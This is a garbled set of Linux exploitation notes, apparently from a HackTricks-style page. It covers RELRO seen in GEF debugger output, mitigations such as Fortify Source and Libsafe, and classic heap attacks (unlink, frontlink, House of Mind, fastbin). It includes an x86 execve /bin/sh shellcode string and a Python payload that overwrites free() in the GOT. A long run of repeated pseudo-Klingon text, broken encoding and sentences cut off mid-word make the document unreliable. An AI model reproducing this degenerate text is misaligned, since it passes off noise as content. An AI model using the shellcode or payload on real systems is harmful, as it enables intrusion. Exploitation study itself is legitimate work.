0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
**ghItlhmeH:**

relro jatlh: relro jatlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhutlh 'e' vItlhutlh. relro jatlh 'e' vItlhut
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
For the binary **without relro**, we can see that the `got` entry address for `fgets` is `0x404018`. Looking at the memory mappings we see that it falls between `0x404000` and `0x405000`, which has the **permissions `rw`**, meaning we can read and write to it. For the binary **with relro**, we see that the `got` table address for the run of the binary (pie is enabled so this address will change) is `0x555555557fd0`. In that binary's memory mapping it falls between `0x0000555555557000` and `0x0000555555558000`, which has the memory **permission `r`**, meaning that we can only read from it.

So what's the **bypass**? The typical bypass I use is to just don't write to memory regions that relro causes to be read only, and **find a different way to get code execution**.

Note that in order for this to happen the binary needs to know previous to execution the addresses to the functions:

* Lazy binding: The address of a function is searched the first time the function is called. So, the GOT needs to have write permissions during execution.
* Bind now: The addresses of the functions are solved at the begginig of the execution, then read-only permissions are given to sensitive sections like .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

To check if a program uses Bind now you can do:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
# /hive/hacktricks/exploiting/linux-exploiting-basic-esp/README.md

---

# Hacking Techniques for Linux Exploitation (Basic ESP)

---

## Descripci√≥n General

Cuando el binario es cargado en memoria y una funci√≥n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aqu√≠ se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcci√≥n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcci√≥n y la guarde en la GOT.

Cuando se llama a una funci√≥n se llama a la PLT, esta tiene la direcci√≥n de la GOT donde se almacena la direcci√≥n de la funci√≥n, por lo que redirige el flujo all√≠ y as√≠ se llama a la funci√≥n. Sin embargo, si es la primera vez que se llama a la funci√≥n, lo que hay en la GOT es la siguiente instrucci√≥n de la PLT, por lo tanto el flujo sigue el c√≥digo de la PLT (rtfd) y averigua la direcci√≥n de la funci√≥n, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en qu√© offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding ‚Äî> La direcci√≥n de la funci√≥n se busca la primera vez que se invoca dicha funci√≥n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah√≠ y no haya que volver a buscarla.

Bind now ‚Äî> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no est√°n complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci√≥n por una funci√≥n segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tama√±o del buffer como tama√±o m√°ximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una secci√≥n con permisos de escritura. Adem√°s el par√°metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la direcci√≥n de otro sitio (como una variable global) el mensaje de error mostrar√° el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librer√≠a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning√∫n ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambi√©n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despu√©s la direcci√≥n a &‚Äù/bin/sh‚Äù.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentaci√≥n de c√≥digo**

Valgrind ‚Äî> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev\_size |\
size | ‚ÄîCabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîCabecera\
\*mem | Datos

Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En ‚Äúsize‚Äù hay bits para indicar: Si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la direcci√≥n de un shellcode y el P->fd con la direcci√≥n a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y as√≠ se se ejecuta al salir del programa la shellcode.

Adem√°s, la 4¬∫ sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

Despu√©s de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que est√° libre) y ‚Äú-4‚Äú(0xfffffffc) en el size (para que cuando compruebe en el 3¬∫ trozo si el 2¬∫ estaba libre en realidad vaya al prev\_size modificado que le dir√° que s¬¥est√° libre) -> As√≠ cuando free() investigue ir√° al size del 3¬∫ pero en realidad ir√° al 2¬∫ - 4 y pensar√° que el 2¬∫ trozo est√° libre. Y entonces llamar√° a **unlink()**.

Al llamar a unlink() usar√° como P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() and FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]

En el segundo trozo y gracias al primero sobreescribimos el prev\_size con un jump 0x0c y el size con algo para activar -> NON\_MAIN\_ARENA

A continuaci√≥n en el trozo 2 ponemos un mont√≥n de nops y finalmente la shellcode

De esta forma se llamar√° a \_int\_free(TROZO1, TROZO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del TROZO2 el cual saltar√° a la shellcode.

Para aplicar esta t√©cnica hace
**Fastbin**

**QawHaq**

Qa'Hom The House of Mind

ghu'vam 'e' vItlhutlh \_int\_free() pagh 'e' vItlhutlh'e'

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

